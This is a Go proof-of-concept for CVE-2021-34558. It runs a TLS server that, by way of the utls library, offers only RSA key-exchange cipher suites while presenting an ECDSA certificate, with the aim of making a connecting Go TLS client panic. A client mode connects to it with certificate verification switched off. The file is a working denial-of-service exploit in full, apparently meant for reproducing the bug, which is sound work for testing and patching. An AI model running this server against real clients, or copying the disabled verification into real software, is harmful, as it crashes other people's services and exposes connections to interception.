package main

// Accepts a single TLS client and performs a handshake
// which should trigger the panic in CVE-2021-34558.

import (
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"flag"
	"log"
	"math/big"
	"net"
	"net/http"
	"time"

	utls "github.com/refraction-networking/utls"
)

var (
	listenAddr string
)

func main() {
	var mode string
	flag.StringVar(&mode, "mode", "server", "server|client")
	flag.StringVar(&listenAddr, "listen", "127.0.0.1:8443", "listen address")
	flag.Parse()

	switch mode {
	case "server":
		serverMain()
	case "client":
		clientMain()
	}
}

func serverMain() {
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatal(err)
	}
	defer listener.Close()

	log.Printf("Listening on %s", listenAddr)

	for {
		client, err := listener.Accept()
		if err != nil {
			log.Fatal(err)
		}

		privKey, certDER := makeECDSACertificate()
		conf := &utls.Config{
			Time:       func() time.Time { return time.Now() },
			Rand:       rand.Reader,
			MinVersion: utls.VersionTLS12,
			MaxVersion: utls.VersionTLS12,
			CipherSuites: []uint16{
				utls.TLS_RSA_WITH_AES_128_GCM_SHA256,
				utls.TLS_RSA_WITH_AES_256_GCM_SHA384,
				utls.TLS_RSA_WITH_AES_128_CBC_SHA256,
				utls.TLS_RSA_WITH_AES_128_CBC_SHA,
				utls.TLS_RSA_WITH_AES_256_CBC_SHA,
				utls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
				utls.TLS_RSA_WITH_RC4_128_SHA,
			},
			Certificates: make([]utls.Certificate, 1),
		}
		conf.Certificates[0].Certificate = [][]byte{certDER}
		conf.Certificates[0].PrivateKey = privKey
		conf.BuildNameToCertificate()

		server := utls.Server(client, conf)
		if err := server.Handshake(); err != nil {
			log.Printf("Handshake failed with: %s", err)
		}
		client.Close()
	}

}

func clientMain() {
	cl := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		}}
	log.Println(cl.Get("https://" + listenAddr + "/"))
}

// privKey, certDER
func makeECDSACertificate() (crypto.PrivateKey, []byte) {
	log.Println("Generating certificate ...")
	priv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tpl := &x509.Certificate{
		SerialNumber: big.NewInt(1234),
		DNSNames:     []string{listenAddr},
	}
	crt, _ := x509.CreateCertificate(rand.Reader, tpl, tpl, &priv.PublicKey, priv)
	return priv, crt
}
